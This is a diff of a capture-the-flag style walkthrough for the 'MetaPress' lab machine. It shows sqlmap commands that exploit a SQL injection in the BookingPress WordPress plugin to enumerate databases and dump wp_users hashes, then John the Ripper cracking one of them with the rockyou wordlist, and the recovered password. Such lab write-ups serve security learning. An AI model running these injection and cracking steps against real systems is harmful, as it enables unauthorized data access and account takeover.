@@ -97,10 +97,39 @@ Referrer-Policy: strict-origin-when-cross-origin
 [{"bookingpress_service_id":"10.5.15-MariaDB-0+deb11u1","bookingpress_category_id":"Debian 11","bookingpress_service_name":"debian-linux-gnu","bookingpress_service_price":"$1.00","bookingpress_service_duration_val":"2","bookingpress_service_duration_unit":"3","bookingpress_service_description":"4","bookingpress_service_position":"5","bookingpress_servicedate_created":"6","service_price_without_currency":1,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"}]
 #+end_quote
 
+** Enumerating databases: Sqlmap
+
 Now we can use sqlmap, which is a tool for automating the process of detecting
 and exploiting SQL injection vulnerabilities. We can use it to identify the
 database management system, enumerate databases, tables and columns, extract the
 data and even run commands.
 
 #+begin_src shell :results output :wrap "quote" :exports both
+sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" --data="action=bookingpress_front_get_category_services&_wpnonce=1b624223cc&category_id=33&total_service=1" -p "total_service" --dbs
 #+end_src
+That way we can enumerate the databases present. I had problems with this command
+since it kept saying that the connection was not stable but i just kept trying
+and eventually I could do it.
+
+The databases that we could found are two: blog and information_schema.
+The first one is the most interesting of the two, clearly.
+
+#+begin_src shell :results output :wrap "quote" :exports both
+sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" --data="action=bookingpress_front_get_category_services&_wpnonce=1b624223cc&category_id=33&total_service=1" -D blog --tables
+#+end_src
+Now we look inside the blog database and enumerate the tables: there is a lot of them
+but the first that catches the eye is wp_users. After some horrible looking output
+we can see that it found two users, admin and manager.
+Along side the names we can see the hashes that correspond to the passwords, so we
+will copy them to a file and try to crack them.
+
+** Cracking the passwords: John the Ripper
+
+#+begin_src shell :results output :wrap "quote" :exports both
+john password.txt --wordlist=/usr/share/wordlists/rockyou.txt
+#+end_src
+We are using John the Reaper which is a hashcracking program, in this case we are
+using the classic rockyou wordlist that. I had to decompress the rockyou file before
+utilizing the command, just so you know.
+
+We see that it found one password, the manager's which is "partylikearockstar".
